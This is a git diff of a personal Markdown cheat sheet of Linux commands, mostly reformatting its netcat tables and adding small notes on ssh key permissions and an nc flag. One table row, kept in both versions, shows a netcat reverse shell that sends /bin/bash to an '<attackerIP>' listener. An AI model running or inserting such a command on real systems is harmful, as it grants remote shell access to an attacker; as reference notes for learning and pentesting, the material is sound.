@@ -192,10 +192,7 @@ tar -xvfj archivedFile.tar.bz2
 tar -xvfJ archivedFile.tar.xz
 ```
 
-
-
-
-
+---
 
 
 # **FOR DISK-RELATED TOOLS**
@@ -556,7 +553,7 @@ Syntax: Using the `-i` flag
 ```Bash
 ssh -i [location/filename] user@host/ip
 ```
-
+Note: make sure the file permission is set to `600`: `chmod 600 filename`
 
 ---
 
@@ -602,32 +599,33 @@ You --> RAW SOCKET --> Remote port
 
 #### What is it used for?
 
-| Category          | Use Case                                            |                                                                                                  |                                                                                                                                                                                                                                               |
-| :---------------- | --------------------------------------------------- | ------------------------------------------------------------------------------------------------ | --------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
-| Debugging         | Test if a port is open, Inspect raw server response | `nc -zv google.com 443`<br><br>`-z` zero I/O scan only<br>`-v` verbose                           |                                                                                                                                                                                                                                               |
-| Port Scanning     | Lightweight scan to check open ports                | `nc -zv <ip> 20-80`<br>form port 20 to port 80                                                   |                                                                                                                                                                                                                                               |
-| Port Listening    | server-side. *Uses the loopback ip as default*      | `nc -l 4444`                                                                                     |                                                                                                                                                                                                                                               |
-| Port Listening    | Explicitly state the server's ip                    | `nc -l <ipadress> <port>`                                                                        |                                                                                                                                                                                                                                               |
-| Banner Grabbing   | Identify what service is running on a port          | `echo "" \| nc -v exmaple.com 80`                                                                |                                                                                                                                                                                                                                               |
-| File Transfer     | Sends files between machines without scp/ftp        | Receiver:  `nc -l 9000 > received_file.tar.gz`<br>Sender:   `nc 192.168.1.10 9000 < file.tar.gz` | TIP: the `>  <` is also use for redirection of text when doing real time chat<br>`nc -lv 4444 > to_this_file`  <br>`nc <ip> <port> > to this file`<br><br>now both text for client and server are redirected to their respective file choice. |
-| Chat              | Primitive real-time chata over a LAN                | Machine A:  `nc -l 5000`<br>Machine B: `nc 192.168.1.10 5000`                                    | Example: Piping <br>`echo "message" \| nc -l <port><br>                                                                                                                                                                                       |
-| Proxying          | Real traffic between hosts                          |                                                                                                  |                                                                                                                                                                                                                                               |
-| Shell Access      | Bind or Reverse shell (used heavily in pentesting)  | Attacker:  `nc -l -p 4444`<br>Victim:  `<attackerIP> 4444 -e /bin/bash`                          |                                                                                                                                                                                                                                               |
-| Server Simulation | Stand up quikc listener to test client behavior     |                                                                                                  |                                                                                                                                                                                                                                               |
+| Category          | Use Case                                            |                                                                                                  |                                                                                                                                                                                                                                                    |
+| :---------------- | --------------------------------------------------- | ------------------------------------------------------------------------------------------------ | -------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
+| Debugging         | Test if a port is open, Inspect raw server response | `nc -zv google.com 443`<br><br>`-z` zero I/O scan only<br>`-v` verbose                           |                                                                                                                                                                                                                                                    |
+| Port Scanning     | Lightweight scan to check open ports                | `nc -zv <ip> 20-80`<br>form port 20 to port 80                                                   |                                                                                                                                                                                                                                                    |
+| Port Listening    | server-side. *Uses the loopback ip as default*      | `nc -l 4444`                                                                                     |                                                                                                                                                                                                                                                    |
+| Port Listening    | Explicitly state the server's ip                    | `nc -l <ipadress> <port>`                                                                        |                                                                                                                                                                                                                                                    |
+| Banner Grabbing   | Identify what service is running on a port          | `echo "" \| nc -v exmaple.com 80`                                                                |                                                                                                                                                                                                                                                    |
+| File Transfer     | Sends files between machines without scp/ftp        | Receiver:  `nc -l 9000 > received_file.tar.gz`<br>Sender:   `nc 192.168.1.10 9000 < file.tar.gz` | TIP: the `>  <` is also use for redirection of text when doing real time chat:<br><br>`nc -lv 4444 > to_this_file`  <br>`nc <ip> <port> > to this file`<br><br>now both text for client and server are redirected to their respective file choice. |
+| Chat              | Primitive real-time chata over a LAN                | Machine A:  `nc -l 5000`<br>Machine B: `nc 192.168.1.10 5000`                                    | Example: Piping a message through<br><br>`echo "message" \| nc -l <port>`<br>                                                                                                                                                                      |
+| Proxying          | Real traffic between hosts                          |                                                                                                  |                                                                                                                                                                                                                                                    |
+| Shell Access      | Bind or Reverse shell (used heavily in pentesting)  | Attacker:  `nc -l -p 4444`<br>Victim:  `<attackerIP> 4444 -e /bin/bash`                          |                                                                                                                                                                                                                                                    |
+| Server Simulation | Stand up quikc listener to test client behavior     |                                                                                                  |                                                                                                                                                                                                                                                    |
 >[!Important] Firewall
 >Dont forget to enable the port that will be used to listen. Or else, clients may not get through.
 
 > Common flags
 
-| Flags | Desc                                        |                                           |
-| :---- | ------------------------------------------- | ----------------------------------------- |
-| `-l`  | listen mode                                 |                                           |
-| `-p`  | state the port to use as a client           | `local source port` — where you send from |
-| `-v`  | verbose                                     |                                           |
-| `-z`  | Scan mode ( no data sent)                   |                                           |
-| `-u`  | UDP mode                                    |                                           |
-| `-e`  | execute program (dangerous, often disabled) |                                           |
-| `-k`  | keeo the connection active                  | (used together with `-l` flag)            |
+| Flags | Desc                                         |                                           |
+| :---- | -------------------------------------------- | ----------------------------------------- |
+| `-l`  | listen mode                                  |                                           |
+| `-p`  | state the port to use as a client            | `local source port` — where you send from |
+| `-v`  | verbose                                      |                                           |
+| `-z`  | Scan mode ( no data sent)                    |                                           |
+| `-u`  | UDP mode                                     |                                           |
+| `-e`  | execute program (dangerous, often disabled)  |                                           |
+| `-k`  | keep the connection active                   | (used together with `-l` flag)            |
+| `-N`  | Terminate the network socket after EOF stdin | useful for scripting in loops             |
 
 
 ### openssl
